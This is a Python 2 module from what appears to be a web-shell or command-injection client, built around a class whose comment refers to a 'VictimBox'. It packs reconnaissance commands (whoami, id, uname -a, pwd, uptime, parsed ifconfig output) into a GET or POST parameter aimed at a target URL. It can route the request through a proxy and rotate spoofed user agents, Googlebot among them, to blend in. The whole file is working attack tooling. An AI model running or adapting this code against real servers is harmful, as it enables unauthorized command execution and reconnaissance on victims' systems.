from urllib import urlencode, quote
from urllib2 import ProxyHandler, build_opener, install_opener
from menu import getargs, Colors
from random import randint

USER_AGENTS = [
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5)",
        "curl/7.7.2 (powerpc-apple-darwin6.0) libcurl 7.7.2 (OpenSSL 0.9.6b)",
        "Mozilla/5.0 (X11; U; Linux amd64; en-US; rv:5.0) Gecko/20110619 Firefox/5.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
        "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
        "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
        "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        ]


class MakeRequest(object):
    '''
    Check for the used method POST or GET
    Adding some commands to cmd requires updating
    self.info in VictimBox class 'victim_info.py'
    '''
    def __init__(self, url=None, method='get', parameter=None):
        self.url = getargs.url
        self.method = getargs.method
        self.parameter = getargs.parameter
        self.proxy = getargs.proxy
        self.user_agent = getargs.agent
        self.random_agent = getargs.random_agent
        self.cmd = 'whoami;'
        self.cmd += 'id;'
        self.cmd += 'uname -a;'
        self.cmd += 'pwd;'
        self.cmd += 'uptime | awk \'{print $3 ":" $5}\' | tr -d "," |  awk -F ":" \'{print $1 " days, " $2 " hours and " $3 " minutes" }\';'
        self.cmd += '/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''

    def get_page_source(self):
        proxy_support = ProxyHandler({'http': self.proxy} if self.proxy else {})
        opener = build_opener(proxy_support)
        if self.random_agent:
            opener.addheaders = [('User-agent', USER_AGENTS[randint(0, len(USER_AGENTS) - 1)])]
        elif self.user_agent:
            opener.addheaders = [('User-agent', self.user_agent)]
        else:
            pass
        install_opener(opener)
        errmsg = '\n{0}[!] Check your connection or the proxy if you\'re using it{1}'.format(Colors.RED, Colors.END)
        # check if the method is post or get
        if self.method == 'post' or self.parameter:
            self.method = 'post'
            parameters = urlencode({self.parameter: self.cmd})
            try:
                sc = opener.open(self.url, parameters)
                return sc
            except Exception, e:
                print errmsg, e
                exit(1)
        # if the used method set get
        else:
            try:
                sc = opener.open('{}{}'.format(self.url, quote(self.cmd)))
                return sc
            except Exception, e:
                print self.url, self.cmd  # , self.cmd, self.parameter, self.method
                print errmsg, e
                exit(1)

make_request = MakeRequest()
